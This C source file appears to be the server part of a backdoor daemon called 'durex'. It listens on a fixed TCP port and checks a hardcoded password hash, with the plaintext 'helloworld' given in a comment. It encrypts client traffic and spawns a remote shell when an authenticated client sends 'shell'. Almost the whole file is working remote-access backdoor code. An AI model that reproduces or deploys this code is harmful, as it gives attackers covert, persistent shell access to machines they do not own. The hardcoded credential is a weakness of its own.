#include "durex.h"

extern t_daemon		g_durex;

/*
** ***********************************************************************
** NAME
**		server_hashpass
**
** DESCRIPTION
**		Hashes a string based on Jenkins' one_at_a_time algorithm.
**
** RETURN VALUE
**		Returns the hash.
** ***********************************************************************
*/

unsigned int	server_hashpass(const char *key, size_t len)
{
	size_t			i = 0;
	unsigned int	hash = 0;

	while (i != len)
	{
		hash += key[i++];
		hash += hash << 10;
		hash ^= hash >> 6;
	}
	hash += hash << 3;
	hash ^= hash >> 11;
	hash += hash << 15;
	return hash;
}

/*
** ***********************************************************************
** NAME
**		server_login
**
** DESCRIPTION
**		Hashes and checks the user password.
**		Temporary password is : "helloworld"
**
** RETURN VALUE
**		On success 0 is returned, -1 otherwise.
** ***********************************************************************
*/

int		server_login(char *key, size_t len)
{
	if (key == NULL || len == 0)
		return (-1);
	if (server_hashpass(key, len) == 1654641804)
		return (0);
	return (-1);
}

/*
** ***********************************************************************
** NAME
**		server_destroy
**
** DESCRIPTION
**		Close the server master socket and all of the connected client
**		sockets.
**
** RETURN VALUE
**		Return 0 anyway.
**
** ***********************************************************************
*/

int		server_destroy(void)
{
	daemon_report(LOG_INFO, "Shutting down server...");

	/*
	** Close down the server socket
	*/
	if (g_durex.sock != -1)
	{
		if (close(g_durex.sock) == -1)
			daemon_report(LOG_ERROR, "Unable to close server socket.");
		else
			daemon_report(LOG_INFO, "Server socket closed.");
	}

	/*
	** Close down the clients sockets and eventually kill the forked
	** remote shells still running
	*/
	if (g_durex.clt != NULL)
	{
		client_lfree(&(g_durex.clt));
	}
	return (0);
}

/*
** ***********************************************************************
** NAME
**		server_create
**
** DESCRIPTION
**		Create a TCP server listening on port $PORT accepting a maximum
**		of $MAX_CLIENTS simultaneous connections.
**
** RETURN VALUE
**		On success 0 is returned, -1 on error.
**
** ***********************************************************************
*/

int		server_create(void)
{
	struct sockaddr_in	sin = { 0 };
	int					reuse = 1;

	/*
	** Create a master TCP socket for bi-directionnal communication
	*/
	daemon_report(LOG_INFO, "Creating server...");
	if ((g_durex.sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1)
	{
		daemon_report(LOG_ERROR, "Unable to create server socket.");
		return (-1);
	}
	else
		daemon_report(LOG_INFO, "Server socket created.");

	/*
	** Set it reusable right after we are done with it
	*/
	setsockopt(g_durex.sock, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));

	/*
	** Bind it to port 4242
	*/
	sin.sin_addr.s_addr = htonl(INADDR_ANY);
	sin.sin_family = AF_INET;
	sin.sin_port = htons(SERVER_PORT);
	if (bind(g_durex.sock, (struct sockaddr *)&sin, sizeof(sin)) == -1)
	{
		daemon_report(LOG_ERROR, "Unable to bind server socket.");
		close(g_durex.sock);
		return (-1);
	}
	else
		daemon_report(LOG_INFO, "Server socket binded.");

	/*
	** Listen for maximum 3 simultaneous connections
	*/
	if (listen(g_durex.sock, MAX_CLIENTS) == -1)
	{
		daemon_report(LOG_ERROR, "Unable to listen on server socket.");
		close(g_durex.sock);
		return (-1);
	}
	else
		daemon_report(LOG_INFO, "Listening on server socket.");

	/*
	** We're done here
	*/
	daemon_report(LOG_INFO, "Server running.");
	return (0);
}

/*
** ***********************************************************************
** NAME
**		server_handle_connections
**
** DESCRIPTION
**		Listen for incomming client connections, disconnections and
**		messages.
**
** RETURN VALUE
**		Return 0.
**
** ***********************************************************************
*/

int		server_handle_connections(void)
{
	int						nbconns = 0;
	fd_set					readfs;
	int						maxsock = g_durex.sock;
	int						tmpsock = -1;
	struct sockaddr_in		csin;
	socklen_t				csinlen = sizeof(struct sockaddr);
	int						ret = -1;
	t_client				*clt = NULL;
	char					access_granted[20] = { '\0' };
	char					access_denied[20] = { '\0' };

	strcpy(access_granted, "Access granted\n");
	strcpy(access_denied, "Keycode$ ");

	while (1)
	{
		/*
		** Clear read fds set to be monitored
		*/
		FD_ZERO(&readfs);

		/*
		** Add server socket
		*/
		FD_SET(g_durex.sock, &readfs);

		/*
		** Add client sockets that are not supposed to be into a
		** remote shell
		*/
		clt = g_durex.clt;
		while (clt != NULL)
		{
			if (clt->shell == FALSE)
				FD_SET(clt->sock, &readfs);
			clt = clt->next;
		}

		/* Poll sockets */
		if (select(maxsock + 1, &readfs, NULL, NULL, NULL) < 0)
			continue ;

		/*
		** If there is activity on the server socket we have a
		** new connection request
		*/
		else if (FD_ISSET(g_durex.sock, &readfs))
		{
			/* Accept connection */
			if ((tmpsock = accept(g_durex.sock, (struct sockaddr *)&csin, &csinlen)) == -1)
				daemon_report(LOG_ERROR, "Unable to accept connection");
			else
			{
				daemon_report(LOG_INFO, "New connection accepted.");

				/* Check if maximum simultaneous connections is reached */
				if (nbconns == 3)
				{
					/* Close back the socket */
					daemon_report(LOG_INFO, "Maximum number of simultaneous connections reached. Closing connection.");
					close(tmpsock);
				}
				else
				{
					/* Add the new connection to the list */
					if (client_add(&(g_durex.clt), client_new(tmpsock)) == -1)
					{
						close(tmpsock);
						daemon_report(LOG_INFO, "Unable to store client socket. Closing connection.");
					}
					else
					{
						/* Update the number of actual connections */
						nbconns += 1;
						
						/* Update the maximum socket number for select */
						maxsock = (tmpsock > maxsock) ? tmpsock : maxsock;

						/* Send keycode string for login */
						send(tmpsock, access_denied, 10, 0);
					}
				}
			}
		}

		/*
		** If there is activity on a client socket it's either an incoming message
		** or a disconnection
		*/
		else
		{
			clt = g_durex.clt;
			while (clt != NULL)
			{
				if (clt->shell == FALSE)
				{
					if (FD_ISSET(clt->sock, &readfs))
					{
						ret = server_handle_message(clt);
						if (ret == MSG_DISCONNECT)
						{
							nbconns -= 1;
							client_ofree(&(g_durex.clt), clt->sock);
						}
						else if (ret == MSG_QUIT)
							return (0);
						else if (ret == MSG_LOGIN_OK)
							send(clt->sock, access_granted, 16, 0);
						else if (ret == MSG_LOGIN_KO)
							send(clt->sock, access_denied, 10, 0);
					}
				}
				clt = clt->next;
			}
		}
	}
	return (0);
}

/*
** ***********************************************************************
** NAME
**		server_handle_message
**
** DESCRIPTION
**		Handle incoming client messages. On a "quit" message, the server
**		shuts down and the daemon exits.
**
** RETURN VALUE
**		MSG_ERROR is retuned if the call to read(2) failed.
**		MSG_DISCONNECT is returned if the call to read(2) returns 0.
**		MSG_LOGIN_OK is retuned if the commands matches with the server
**		password ; MSG_LOGIN_KO otherwise.
**		MSG_COMMAND is returned if the previous attempt of login was
**		successful.
**		MSG_QUIT is returned if the message received matches "quit".
**
** ***********************************************************************
*/

int		server_handle_message(t_client *client)
{
	char		buf[4096] = { '\0' };		// Main socket read buffer
	ssize_t		bytes = 0;					// Number of bytes read
	char		*clear = NULL;
	/*
	** If read returns < 0 it means we had an error while reading on socket
	*/
	if ((bytes = read(client->sock, buf, 4095)) < 0)
	{
		daemon_report(LOG_ERROR, "Unable to read on client socket.");
		return (MSG_ERROR);
	}

	/*
	** If read returns 0 it means the socket is disconnected
	*/
	else if (bytes == 0)
	{
		daemon_report(LOG_INFO, "Client disconnected.");
		return (MSG_DISCONNECT);
	}

	/*
	** Otherwise we have an incoming message
	*/
	else
	{
		/*
		** We first log the message
		*/
		buf[bytes] = '\0';
		//daemon_report(LOG_USER, buf);

		/*
		** If client has no access granted yet...
		*/
		if (client->log == LOGIN_PENDING)
		{
			daemon_report(LOG_INFO, "Unknown user. Checking password validity...");
			    if (server_login(buf, bytes) == 0)
			      {
				client->log = LOGIN_GRANTED;
				daemon_report(LOG_INFO, "Valid password. User access granted.");
				init_key(client);
				return (MSG_LOGIN_OK);
			      }
			    else
			      {
				daemon_report(LOG_INFO, "Invalid password. User access denied.");
				return (MSG_LOGIN_KO);
			      }
		}
		
		/*
		 * if client has access granted && is_key == FLASE
		 */
		else if (client->log == LOGIN_GRANTED && client->is_key == FALSE)
		  {
		    daemon_report(LOG_INFO, "Known user. Encryption key not set, checking...");
		    if (handle_keys((unsigned char *)buf, client) == -2)
		      return (MSG_ERROR);
		  }
		
		/*
		** If client has access granted !
		*/
		else if (client->log == LOGIN_GRANTED && client->is_key == TRUE)
		{
		  /*
		   * message incomming is encypte
		   * decrypt it and log it
		   */
		  if (client->sched == NULL)
		    {
		      client->sched = (rijn_keysched_t *)malloc(sizeof(rijn_keysched_t) * 100);
		      rijn_init(client->sched, client->shared_key);
		    }
		  clear = rijn_build_decrypt(client->sched, (unsigned char *)buf);
		  if (clear == NULL)
		    return (MSG_COMMAND);
		  daemon_report(LOG_USER, clear);
		  daemon_report(LOG_INFO, "Known user. Evaluating command...");

		  /*
		  ** If the message is "quit" we need to cleanly shut down the server
		  ** and exit the daemon
		  */
		  if (strcmp("quit", clear) == 0)
		    return (MSG_QUIT);

		  /*
		  ** If the message is "shell" we need to spawn a remote shell
		  */
		  else if (strcmp("shell", clear) == 0)
		    {
		      daemon_report(LOG_INFO, "Spawning a remote shell...");
		      shell_master(client);
		    }

		  if (clear)
		    free(clear);
		}
	}
	return (MSG_COMMAND);
}
